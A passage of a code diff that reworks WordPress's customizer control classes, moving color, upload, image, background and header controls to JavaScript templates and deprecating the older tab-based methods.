 				</label>
 				<?php
 				break;
@@ -304,8 +487,53 @@ class WP_Customize_Control {
 					$dropdown
 				);
 				break;
+			default:
+				?>
+				<label>
+					<?php if ( ! empty( $this->label ) ) : ?>
+						<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
+					<?php endif;
+					if ( ! empty( $this->description ) ) : ?>
+						<span class="description customize-control-description"><?php echo $this->description; ?></span>
+					<?php endif; ?>
+					<input type="<?php echo esc_attr( $this->type ); ?>" <?php $this->input_attrs(); ?> value="<?php echo esc_attr( $this->value() ); ?>" <?php $this->link(); ?> />
+				</label>
+				<?php
+				break;
 		}
 	}
+
+	/**
+	 * Render the control's JS template.
+	 *
+	 * This function is only run for control types that have been registered with
+	 * {@see WP_Customize_Manager::register_control_type()}.
+	 *
+	 * In the future, this will also print the template for the control's container
+	 * element and be override-able.
+	 *
+	 * @since 4.1.0
+	 */
+	final public function print_template() {
+	        ?>
+	        <script type="text/html" id="tmpl-customize-control-<?php echo $this->type; ?>-content">
+	                <?php $this->content_template(); ?>
+	        </script>
+	        <?php
+	}
+
+	/**
+	 * An Underscore (JS) template for this control's content (but not its container).
+	 *
+	 * Class variables for this control class are available in the `data` JS object;
+	 * export custom variables by overriding {@see WP_Customize_Control::to_json()}.
+	 *
+	 * @see WP_Customize_Control::print_template()
+	 *
+	 * @since 4.1.0
+	 */
+	protected function content_template() {}
+
 }
 
 /**
@@ -331,8 +559,6 @@ class WP_Customize_Color_Control extends WP_Customize_Control {
 	/**
 	 * Constructor.
 	 *
-	 * If $args['settings'] is not defined, use the $id as the setting ID.
-	 *
 	 * @since 3.4.0
 	 * @uses WP_Customize_Control::__construct()
 	 *
@@ -346,7 +572,7 @@ class WP_Customize_Color_Control extends WP_Customize_Control {
 	}
 
 	/**
-	 * Enqueue control related scripts/styles.
+	 * Enqueue scripts/styles for the color picker.
 	 *
 	 * @since 3.4.0
 	 */
@@ -364,27 +590,41 @@ class WP_Customize_Color_Control extends WP_Customize_Control {
 	public function to_json() {
 		parent::to_json();
 		$this->json['statuses'] = $this->statuses;
+		$this->json['defaultValue'] = $this->setting->default;
 	}
 
 	/**
-	 * Render the control's content.
+	 * Don't render the control content from PHP, as it's rendered via JS on load.
 	 *
 	 * @since 3.4.0
 	 */
-	public function render_content() {
-		$this_default = $this->setting->default;
-		$default_attr = '';
-		if ( $this_default ) {
-			if ( false === strpos( $this_default, '#' ) )
-				$this_default = '#' . $this_default;
-			$default_attr = ' data-default-color="' . esc_attr( $this_default ) . '"';
-		}
-		// The input's value gets set by JS. Don't fill it.
+	public function render_content() {}
+
+	/**
+	 * Render a JS template for the content of the color picker control.
+	 *
+	 * @since 4.1.0
+	 */
+	public function content_template() {
 		?>
+		<# var defaultValue = '';
+		if ( data.defaultValue ) {
+			if ( '#' !== data.defaultValue.substring( 0, 1 ) ) {
+				defaultValue = '#' + data.defaultValue;
+			} else {
+				defaultValue = data.defaultValue;
+			}
+			defaultValue = ' data-default-color=' + defaultValue; // Quotes added automatically.
+		} #>
 		<label>
-			<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
+			<# if ( data.label ) { #>
+				<span class="customize-control-title">{{{ data.label }}}</span>
+			<# } #>
+			<# if ( data.description ) { #>
+				<span class="description customize-control-description">{{{ data.description }}}</span>
+			<# } #>
 			<div class="customize-control-content">
-				<input class="color-picker-hex" type="text" maxlength="7" placeholder="<?php esc_attr_e( 'Hex Value' ); ?>"<?php echo $default_attr ?> />
+				<input class="color-picker-hex" type="text" maxlength="7" placeholder="<?php esc_attr_e( 'Hex Value' ); ?>" {{ defaultValue }} />
 			</div>
 		</label>
 		<?php
@@ -399,10 +639,33 @@ class WP_Customize_Color_Control extends WP_Customize_Control {
  * @since 3.4.0
  */
 class WP_Customize_Upload_Control extends WP_Customize_Control {
-	public $type    = 'upload';
-	public $removed = '';
-	public $context;
-	public $extensions = array();
+	public $type          = 'upload';
+	public $mime_type     = '';
+	public $button_labels = array();
+	public $removed = ''; // unused
+	public $context; // unused
+	public $extensions = array(); // unused
+
+	/**
+	 * Constructor.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @param WP_Customize_Manager $manager {@see WP_Customize_Manager} instance.
+	 */
+	public function __construct( $manager, $id, $args = array() ) {
+		parent::__construct( $manager, $id, $args );
+
+		$this->button_labels = array(
+			'select'       => __( 'Select File' ),
+			'change'       => __( 'Change File' ),
+			'default'      => __( 'Default' ),
+			'remove'       => __( 'Remove' ),
+			'placeholder'  => __( 'No file selected' ),
+			'frame_title'  => __( 'Select File' ),
+			'frame_button' => __( 'Choose File' ),
+		);
+	}
 
 	/**
 	 * Enqueue control related scripts/styles.
@@ -410,7 +673,7 @@ class WP_Customize_Upload_Control extends WP_Customize_Control {
 	 * @since 3.4.0
 	 */
 	public function enqueue() {
-		wp_enqueue_script( 'wp-plupload' );
+		wp_enqueue_media();
 	}
 
 	/**
@@ -421,30 +684,120 @@ class WP_Customize_Upload_Control extends WP_Customize_Control {
 	 */
 	public function to_json() {
 		parent::to_json();
+		$this->json['mime_type'] = $this->mime_type;
+		$this->json['button_labels'] = $this->button_labels;
 
-		$this->json['removed'] = $this->removed;
+		$value = $this->value();
 
-		if ( $this->context )
-			$this->json['context'] = $this->context;
+		if ( is_object( $this->setting ) ) {
+			if ( $this->setting->default ) {
+				// Fake an attachment model - needs all fields used by template.
+				$type = in_array( substr( $this->setting->default, -3 ), array( 'jpg', 'png', 'gif', 'bmp' ) ) ? 'image' : 'document';
+				$default_attachment = array(
+					'id' => 1,
+					'url' => $this->setting->default,
+					'type' => $type,
+					'icon' => wp_mime_type_icon( $type ),
+					'title' => basename( $this->setting->default ),
+				);
 
-		if ( $this->extensions )
-			$this->json['extensions'] = implode( ',', $this->extensions );
+				if ( 'image' === $type ) {
+					$default_attachment['sizes'] = array(
+						'full' => array( 'url' => $this->setting->default ),
+					);
+				}
+
+				$this->json['defaultAttachment'] = $default_attachment;
+			}
+
+			if ( $value && $this->setting->default && $value === $this->setting->default ) {
+				// Set the default as the attachment.
+				$this->json['attachment'] = $this->json['defaultAttachment'];
+			} elseif ( $value ) {
+				// Get the attachment model for the existing file.
+				$attachment_id = attachment_url_to_postid( $value );
+				if ( $attachment_id ) {
+					$this->json['attachment'] = wp_prepare_attachment_for_js( $attachment_id );
+				}
+			}
+		}
 	}
 
 	/**
-	 * Render the control's content.
+	 * Don't render any content for this control from PHP.
 	 *
+	 * @see WP_Customize_Upload_Control::content_template()
 	 * @since 3.4.0
 	 */
-	public function render_content() {
+	public function render_content() {}
+
+	/**
+	 * Render a JS template for the content of the upload control.
+	 *
+	 * @since 4.1.0
+	 */
+	public function content_template() {
 		?>
-		<label>
-			<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
-			<div>
-				<a href="#" class="button-secondary upload"><?php _e( 'Upload' ); ?></a>
-				<a href="#" class="remove"><?php _e( 'Remove' ); ?></a>
-			</div>
+		<label for="{{ data.settings.default }}-button">
+			<# if ( data.label ) { #>
+				<span class="customize-control-title">{{ data.label }}</span>
+			<# } #>
+			<# if ( data.description ) { #>
+				<span class="description customize-control-description">{{{ data.description }}}</span>
+			<# } #>
 		</label>
+
+		<# if ( data.attachment && data.attachment.id ) { #>
+			<div class="current">
+				<div class="container">
+					<div class="attachment-media-view attachment-media-view-{{ data.attachment.type }} {{ data.attachment.orientation }}">
+						<div class="thumbnail thumbnail-{{ data.attachment.type }}">
+							<# if ( 'image' === data.attachment.type && data.attachment.sizes && data.attachment.sizes.medium ) { #>
+								<img class="attachment-thumb" src="{{ data.attachment.sizes.medium.url }}" draggable="false" />
+							<# } else if ( 'image' === data.attachment.type && data.attachment.sizes && data.attachment.sizes.full ) { #>
+								<img class="attachment-thumb" src="{{ data.attachment.sizes.full.url }}" draggable="false" />
+							<# } else if ( 'audio' === data.attachment.type ) { #>
+								<img class="attachment-thumb type-icon" src="{{ data.attachment.icon }}" class="icon" draggable="false" />
+								<p class="attachment-meta attachment-meta-title">&#8220;{{ data.attachment.title }}&#8221;</p>
+								<# if ( data.attachment.album || data.attachment.meta.album ) { #>
+								<p class="attachment-meta"><em>{{ data.attachment.album || data.attachment.meta.album }}</em></p>
+								<# } #>
+								<# if ( data.attachment.artist || data.attachment.meta.artist ) { #>
+								<p class="attachment-meta">{{ data.attachment.artist || data.attachment.meta.artist }}</p>
+								<# } #>
+							<# } else { #>
+								<img class="attachment-thumb type-icon" src="{{ data.attachment.icon }}" class="icon" draggable="false" />
+								<p class="attachment-title">{{ data.attachment.title }}</p>
+							<# } #>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="actions">
+				<button type="button" class="button remove-button"><?php echo $this->button_labels['remove']; ?></button>
+				<button type="button" class="button upload-button" id="{{ data.settings.default }}-button"><?php echo $this->button_labels['change']; ?></button>
+				<div style="clear:both"></div>
+			</div>
+		<# } else { #>
+			<div class="current">
+				<div class="container">
+					<div class="placeholder">
+						<div class="inner">
+							<span>
+								<?php echo $this->button_labels['placeholder']; ?>
+							</span>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="actions">
+				<# if ( data.defaultAttachment ) { #>
+					<button type="button" class="button default-button"><?php echo $this->button_labels['default']; ?></button>
+				<# } #>
+				<button type="button" class="button upload-button" id="{{ data.settings.default }}-button"><?php echo $this->button_labels['select']; ?></button>
+				<div style="clear:both"></div>
+			</div>
+		<# } #>
 		<?php
 	}
 }
@@ -458,180 +811,64 @@ class WP_Customize_Upload_Control extends WP_Customize_Control {
  */
 class WP_Customize_Image_Control extends WP_Customize_Upload_Control {
 	public $type = 'image';
-	public $get_url;
-	public $statuses;
-	public $extensions = array( 'jpg', 'jpeg', 'gif', 'png' );
-
-	protected $tabs = array();
+	public $mime_type = 'image';
 
 	/**
 	 * Constructor.
-	 *
-	 * If $args['settings'] is not defined, use the $id as the setting ID.
 	 *
 	 * @since 3.4.0
 	 * @uses WP_Customize_Upload_Control::__construct()
 	 *
 	 * @param WP_Customize_Manager $manager
 	 * @param string $id
-	 * @param array $args
+	 * @param array  $args
 	 */
-	public function __construct( $manager, $id, $args ) {
-		$this->statuses = array( '' => __('No Image') );
-
+	public function __construct( $manager, $id, $args = array() ) {
 		parent::__construct( $manager, $id, $args );
 
-		$this->add_tab( 'upload-new', __('Upload New'), array( $this, 'tab_upload_new' ) );
-		$this->add_tab( 'uploaded',   __('Uploaded'),   array( $this, 'tab_uploaded' ) );
-
-		// Early priority to occur before $this->manager->prepare_controls();
-		add_action( 'customize_controls_init', array( $this, 'prepare_control' ), 5 );
+		$this->button_labels = array(
+			'select'       => __( 'Select Image' ),
+			'change'       => __( 'Change Image' ),
+			'remove'       => __( 'Remove' ),
+			'default'      => __( 'Default' ),
+			'placeholder'  => __( 'No image selected' ),
+			'frame_title'  => __( 'Select Image' ),
+			'frame_button' => __( 'Choose Image' ),
+		);
 	}
 
 	/**
-	 * Prepares the control.
-	 *
-	 * If no tabs exist, removes the control from the manager.
-	 *
 	 * @since 3.4.2
+	 * @deprecated 4.1.0
 	 */
-	public function prepare_control() {
-		if ( ! $this->tabs )
-			$this->manager->remove_control( $this->id );
-	}
+	public function prepare_control() {}
 
 	/**
-	 * Refresh the parameters passed to the JavaScript via JSON.
-	 *
 	 * @since 3.4.0
-	 * @uses WP_Customize_Upload_Control::to_json()
-	 */
-	public function to_json() {
-		parent::to_json();
-		$this->json['statuses'] = $this->statuses;
-	}
-
-	/**
-	 * Render the control's content.
-	 *
-	 * @since 3.4.0
-	 */
-	public function render_content() {
-		$src = $this->value();
-		if ( isset( $this->get_url ) )
-			$src = call_user_func( $this->get_url, $src );
-
-		?>
-		<div class="customize-image-picker">
-			<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
-
-			<div class="customize-control-content">
-				<div class="dropdown preview-thumbnail" tabindex="0">
-					<div class="dropdown-content">
-						<?php if ( empty( $src ) ): ?>
-							<img style="display:none;" />
-						<?php else: ?>
-							<img src="<?php echo esc_url( set_url_scheme( $src ) ); ?>" />
-						<?php endif; ?>
-						<div class="dropdown-status"></div>
-					</div>
-					<div class="dropdown-arrow"></div>
-				</div>
-			</div>
-
-			<div class="library">
-				<ul>
-					<?php foreach ( $this->tabs as $id => $tab ): ?>
-						<li data-customize-tab='<?php echo esc_attr( $id ); ?>' tabindex='0'>
-							<?php echo esc_html( $tab['label'] ); ?>
-						</li>
-					<?php endforeach; ?>
-				</ul>
-				<?php foreach ( $this->tabs as $id => $tab ): ?>
-					<div class="library-content" data-customize-tab='<?php echo esc_attr( $id ); ?>'>
-						<?php call_user_func( $tab['callback'] ); ?>
-					</div>
-				<?php endforeach; ?>
-			</div>
-
-			<div class="actions">
-				<a href="#" class="remove"><?php _e( 'Remove Image' ); ?></a>
-			</div>
-		</div>
-		<?php
-	}
-
-	/**
-	 * Add a tab to the control.
-	 *
-	 * @since 3.4.0
+	 * @deprecated 4.1.0
 	 *
 	 * @param string $id
 	 * @param string $label
 	 * @param mixed $callback
 	 */
-	public function add_tab( $id, $label, $callback ) {
-		$this->tabs[ $id ] = array(
-			'label'    => $label,
-			'callback' => $callback,
-		);
-	}
+	public function add_tab( $id, $label, $callback ) {}
 
 	/**
-	 * Remove a tab from the control.
-	 *
 	 * @since 3.4.0
+	 * @deprecated 4.1.0
 	 *
 	 * @param string $id
 	 */
-	public function remove_tab( $id ) {
-		unset( $this->tabs[ $id ] );
-	}
+	public function remove_tab( $id ) {}
 
 	/**
 	 * @since 3.4.0
-	 */
-	public function tab_upload_new() {
-		if ( ! _device_can_upload() ) {
-			?>
-			<p><?php _e('The web browser on your device cannot be used to upload files. You may be able to use the <a href="http://wordpress.org/extend/mobile/">native app for your device</a> instead.'); ?></p>
-			<?php
-		} else {
-			?>
-			<div class="upload-dropzone">
-				<?php _e('Drop a file here or <a href="#" class="upload">select a file</a>.'); ?>
-			</div>
-			<div class="upload-fallback">
-				<span class="button-secondary"><?php _e('Select File'); ?></span>
-			</div>
-			<?php
-		}
-	}
-
-	/**
-	 * @since 3.4.0
-	 */
-	public function tab_uploaded() {
-		?>
-		<div class="uploaded-target"></div>
-		<?php
-	}
-
-	/**
-	 * @since 3.4.0
+	 * @deprecated 4.1.0
 	 *
 	 * @param string $url
 	 * @param string $thumbnail_url
 	 */
-	public function print_tab_image( $url, $thumbnail_url = null ) {
-		$url = set_url_scheme( $url );
-		$thumbnail_url = ( $thumbnail_url ) ? set_url_scheme( $thumbnail_url ) : $url;
-		?>
-		<a href="#" class="thumbnail" data-customize-image-value="<?php echo esc_url( $url ); ?>">
-			<img src="<?php echo esc_url( $thumbnail_url ); ?>" />
-		</a>
-		<?php
-	}
+	public function print_tab_image( $url, $thumbnail_url = null ) {}
 }
 
 /**
@@ -642,6 +879,7 @@ class WP_Customize_Image_Control extends WP_Customize_Upload_Control {
  * @since 3.4.0
  */
 class WP_Customize_Background_Image_Control extends WP_Customize_Image_Control {
+	public $type = 'background';
 
 	/**
 	 * Constructor.
@@ -655,73 +893,31 @@ class WP_Customize_Background_Image_Control extends WP_Customize_Image_Control {
 		parent::__construct( $manager, 'background_image', array(
 			'label'    => __( 'Background Image' ),
 			'section'  => 'background_image',
-			'context'  => 'custom-background',
-			'get_url'  => 'get_background_image',
 		) );
-
-		if ( $this->setting->default )
-			$this->add_tab( 'default',  __('Default'),  array( $this, 'tab_default_background' ) );
 	}
 
 	/**
-	 * @since 3.4.0
+	 * Enqueue control related scripts/styles.
+	 *
+	 * @since 4.1.0
 	 */
-	public function tab_uploaded() {
-		$backgrounds = get_posts( array(
-			'post_type'  => 'attachment',
-			'meta_key'   => '_wp_attachment_is_custom_background',
-			'meta_value' => $this->manager->get_stylesheet(),
-			'orderby'    => 'none',
-			'nopaging'   => true,
+	public function enqueue() {
+		parent::enqueue();
+
+		wp_localize_script( 'customize-controls', '_wpCustomizeBackground', array(
+			'nonces' => array(
+				'add' => wp_create_nonce( 'background-add' ),
+			),
 		) );
-
-		?><div class="uploaded-target"></div><?php
-
-		if ( empty( $backgrounds ) )
-			return;
-
-		foreach ( (array) $backgrounds as $background )
-			$this->print_tab_image( esc_url_raw( $background->guid ) );
-	}
-
-	/**
-	 * @since 3.4.0
-	 * @uses WP_Customize_Image_Control::print_tab_image()
-	 */
-	public function tab_default_background() {
-		$this->print_tab_image( $this->setting->default );
 	}
 }
 
-/**
- * Customize Header Image Control Class
- *
- * @package WordPress
- * @subpackage Customize
- * @since 3.4.0
- */
 class WP_Customize_Header_Image_Control extends WP_Customize_Image_Control {
-	/**
-	 * The processed default headers.
-	 * @since 3.4.2
-	 * @var array
-	 */
-	protected $default_headers;
+	public $type = 'header';
+	public $uploaded_headers;
+	public $default_headers;
 
 	/**
-	 * The uploaded headers.
-	 * @since 3.4.2
-	 * @var array
-	 */
-	protected $uploaded_headers;
-
-	/**
-	 * Constructor.
-	 *
-	 * @since 3.4.0
-	 * @uses WP_Customize_Image_Control::__construct()
-	 * @uses WP_Customize_Image_Control::add_tab()
-	 *
 	 * @param WP_Customize_Manager $manager
 	 */
 	public function __construct( $manager ) {
@@ -732,88 +928,265 @@ class WP_Customize_Header_Image_Control extends WP_Customize_Image_Control {
 				'data'    => 'header_image_data',
 			),
 			'section'  => 'header_image',
-			'context'  => 'custom-header',
 			'removed'  => 'remove-header',
 			'get_url'  => 'get_header_image',
-			'statuses' => array(
-				''                      => __('Default'),
-				'remove-header'         => __('No Image'),
-				'random-default-image'  => __('Random Default Image'),
-				'random-uploaded-image' => __('Random Uploaded Image'),
-			)
 		) );
 
-		// Remove the upload tab.
-		$this->remove_tab( 'upload-new' );
 	}
 
-	/**
-	 * Prepares the control.
-	 *
-	 * If no tabs exist, removes the control from the manager.
-	 *
-	 * @since 3.4.2
-	 */
+	public function to_json() {
+		parent::to_json();
+	}
+
+	public function enqueue() {
+		wp_enqueue_media();
+		wp_enqueue_script( 'customize-views' );
+
+		$this->prepare_control();
+
+		wp_localize_script( 'customize-views', '_wpCustomizeHeader', array(
+			'data' => array(
+				'width' => absint( get_theme_support( 'custom-header', 'width' ) ),
+				'height' => absint( get_theme_support( 'custom-header', 'height' ) ),
+				'flex-width' => absint( get_theme_support( 'custom-header', 'flex-width' ) ),
+				'flex-height' => absint( get_theme_support( 'custom-header', 'flex-height' ) ),
+				'currentImgSrc' => $this->get_current_image_src(),
+			),
+			'nonces' => array(
+				'add' => wp_create_nonce( 'header-add' ),
+				'remove' => wp_create_nonce( 'header-remove' ),
+			),
+			'uploads' => $this->uploaded_headers,
+			'defaults' => $this->default_headers
+		) );
+
+		parent::enqueue();
+	}
+
 	public function prepare_control() {
 		global $custom_image_header;
-		if ( empty( $custom_image_header ) )
-			return parent::prepare_control();
+		if ( empty( $custom_image_header ) ) {
+			return;
+		}
 
 		// Process default headers and uploaded headers.
 		$custom_image_header->process_default_headers();
-		$this->default_headers = $custom_image_header->default_headers;
-		$this->uploaded_headers = get_uploaded_header_images();
-
-		if ( $this->default_headers )
-			$this->add_tab( 'default',  __('Default'),  array( $this, 'tab_default_headers' ) );
-
-		if ( ! $this->uploaded_headers )
-			$this->remove_tab( 'uploaded' );
-
-		return parent::prepare_control();
+		$this->default_headers = $custom_image_header->get_default_header_images();
+		$this->uploaded_headers = $custom_image_header->get_uploaded_header_images();
 	}
 
-	/**
-	 * @since 3.4.0
-	 *
-	 * @param mixed $choice Which header image to select. (@see Custom_Image_Header::get_header_image() )
-	 * @param array $header
-	 */
-	public function print_header_image( $choice, $header ) {
-		$header['url']           = set_url_scheme( $header['url'] );
-		$header['thumbnail_url'] = set_url_scheme( $header['thumbnail_url'] );
-
-		$header_image_data = array( 'choice' => $choice );
-		foreach ( array( 'attachment_id', 'width', 'height', 'url', 'thumbnail_url' ) as $key ) {
-			if ( isset( $header[ $key ] ) )
-				$header_image_data[ $key ] = $header[ $key ];
-		}
-
-
+	function print_header_image_template() {
 		?>
-		<a href="#" class="thumbnail"
-			data-customize-image-value="<?php echo esc_url( $header['url'] ); ?>"
-			data-customize-header-image-data="<?php echo esc_attr( json_encode( $header_image_data ) ); ?>">
-			<img src="<?php echo esc_url( $header['thumbnail_url'] ); ?>" />
-		</a>
+		<script type="text/template" id="tmpl-header-choice">
+			<# if (data.random) { #>
+					<button type="button" class="button display-options random">
+						<span class="dashicons dashicons-randomize dice"></span>
+						<# if ( data.type === 'uploaded' ) { #>
+							<?php _e( 'Randomize uploaded headers' ); ?>
+						<# } else if ( data.type === 'default' ) { #>
+							<?php _e( 'Randomize suggested headers' ); ?>
+						<# } #>
+					</button>
+
+			<# } else { #>
+
+			<# if (data.type === 'uploaded') { #>
+				<div class="dashicons dashicons-no close"></div>
+			<# } #>
+
+			<button type="button" class="choice thumbnail"
+				data-customize-image-value="{{{data.header.url}}}"
+				data-customize-header-image-data="{{JSON.stringify(data.header)}}">
+				<span class="screen-reader-text"><?php _e( 'Set image' ); ?></span>
+				<img src="{{{data.header.thumbnail_url}}}" alt="{{{data.header.alt_text || data.header.description}}}">
+			</button>
+
+			<# } #>
+		</script>
+
+		<script type="text/template" id="tmpl-header-current">
+			<# if (data.choice) { #>
+				<# if (data.random) { #>
+
+			<div class="placeholder">
+				<div class="inner">
+					<span><span class="dashicons dashicons-randomize dice"></span>
+					<# if ( data.type === 'uploaded' ) { #>
+						<?php _e( 'Randomizing uploaded headers' ); ?>
+					<# } else if ( data.type === 'default' ) { #>
+						<?php _e( 'Randomizing suggested headers' ); ?>
+					<# } #>
+					</span>
+				</div>
+			</div>
+
+				<# } else { #>
+
+			<img src="{{{data.header.thumbnail_url}}}" alt="{{{data.header.alt_text || data.header.description}}}" tabindex="0"/>
+
+				<# } #>
+			<# } else { #>
+
+			<div class="placeholder">
+				<div class="inner">
+					<span>
+						<?php _e( 'No image set' ); ?>
+					</span>
+				</div>
+			</div>
+
+			<# } #>
+		</script>
 		<?php
 	}
 
-	/**
-	 * @since 3.4.0
-	 */
-	public function tab_uploaded() {
-		?><div class="uploaded-target"></div><?php
-
-		foreach ( $this->uploaded_headers as $choice => $header )
-			$this->print_header_image( $choice, $header );
+	public function get_current_image_src() {
+		$src = $this->value();
+		if ( isset( $this->get_url ) ) {
+			$src = call_user_func( $this->get_url, $src );
+			return $src;
+		}
+		return null;
 	}
 
-	/**
-	 * @since 3.4.0
-	 */
-	public function tab_default_headers() {
-		foreach ( $this->default_headers as $choice => $header )
-			$this->print_header_image( $choice, $header );
+	public function render_content() {
+		$this->print_header_image_template();
+		$visibility = $this->get_current_image_src() ? '' : ' style="display:none" ';
+		$width = absint( get_theme_support( 'custom-header', 'width' ) );
+		$height = absint( get_theme_support( 'custom-header', 'height' ) );
+		?>
+
+
+		<div class="customize-control-content">
+			<p class="customizer-section-intro">
+				<?php
+				if ( $width && $height ) {
+					printf( __( 'While you can crop images to your liking after clicking <strong>Add new image</strong>, your theme recommends a header size of <strong>%s &times; %s</strong> pixels.' ), $width, $height );
+				} elseif ( $width ) {
+					printf( __( 'While you can crop images to your liking after clicking <strong>Add new image</strong>, your theme recommends a header width of <strong>%s</strong> pixels.' ), $width );
+				} else {
+					printf( __( 'While you can crop images to your liking after clicking <strong>Add new image</strong>, your theme recommends a header height of <strong>%s</strong> pixels.' ), $height );
+				}
+				?>
+			</p>
+			<div class="current">
+				<span class="customize-control-title">
+					<?php _e( 'Current header' ); ?>
+				</span>
+				<div class="container">
+				</div>
+			</div>
+			<div class="actions">
+				<?php /* translators: Hide as in hide header image via the Customizer */ ?>
+				<button type="button"<?php echo $visibility ?> class="button remove"><?php _ex( 'Hide image', 'custom header' ); ?></button>
+				<?php /* translators: New as in add new header image via the Customizer */ ?>
+				<button type="button" class="button new"><?php _ex( 'Add new image', 'header image' ); ?></button>
+				<div style="clear:both"></div>
+			</div>
+			<div class="choices">
+				<span class="customize-control-title header-previously-uploaded">
+					<?php _ex( 'Previously uploaded', 'custom headers' ); ?>
+				</span>
+				<div class="uploaded">
+					<div class="list">
+					</div>
+				</div>
+				<span class="customize-control-title header-default">
+					<?php _ex( 'Suggested', 'custom headers' ); ?>
+				</span>
+				<div class="default">
+					<div class="list">
+					</div>
+				</div>
+			</div>
+		</div>
+		<?php
 	}
 }
+
+/**
+ * Widget Area Customize Control Class
+ *
+ * @since 3.9.0
+ */
+class WP_Widget_Area_Customize_Control extends WP_Customize_Control {
+	public $type = 'sidebar_widgets';
+	public $sidebar_id;
+
+	public function to_json() {
+		parent::to_json();
+		$exported_properties = array( 'sidebar_id' );
+		foreach ( $exported_properties as $key ) {
+			$this->json[ $key ] = $this->$key;
+		}
+	}
+
+	public function render_content() {
+		?>
+		<span class="button-secondary add-new-widget" tabindex="0">
+			<?php _e( 'Add a Widget' ); ?>
+		</span>
+
+		<span class="reorder-toggle" tabindex="0">
+			<span class="reorder"><?php _ex( 'Reorder', 'Reorder widgets in Customizer' ); ?></span>
+			<span class="reorder-done"><?php _ex( 'Done', 'Cancel reordering widgets in Customizer'  ); ?></span>
+		</span>
+		<?php
+	}
+
+}
+
+/**
+ * Widget Form Customize Control Class
+ *
+ * @since 3.9.0
+ */
+class WP_Widget_Form_Customize_Control extends WP_Customize_Control {
+	public $type = 'widget_form';
+	public $widget_id;
+	public $widget_id_base;
+	public $sidebar_id;
+	public $is_new = false;
+	public $width;
+	public $height;
+	public $is_wide = false;
+
+	public function to_json() {
+		parent::to_json();
+		$exported_properties = array( 'widget_id', 'widget_id_base', 'sidebar_id', 'width', 'height', 'is_wide' );
+		foreach ( $exported_properties as $key ) {
+			$this->json[ $key ] = $this->$key;
+		}
+	}
+
+	public function render_content() {
+		global $wp_registered_widgets;
+		require_once ABSPATH . '/wp-admin/includes/widgets.php';
+
+		$widget = $wp_registered_widgets[ $this->widget_id ];
+		if ( ! isset( $widget['params'][0] ) ) {
+			$widget['params'][0] = array();
+		}
+
+		$args = array(
+			'widget_id' => $widget['id'],
+			'widget_name' => $widget['name'],
+		);
+
+		$args = wp_list_widget_controls_dynamic_sidebar( array( 0 => $args, 1 => $widget['params'][0] ) );
+		echo $this->manager->widgets->get_widget_control( $args );
+	}
+
+	/**
+	 * Whether the current widget is rendered on the page.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @return bool Whether the widget is rendered.
+	 */
+	function active_callback() {
+		return $this->manager->widgets->is_widget_rendered( $this->widget_id );
+	}
+}
+
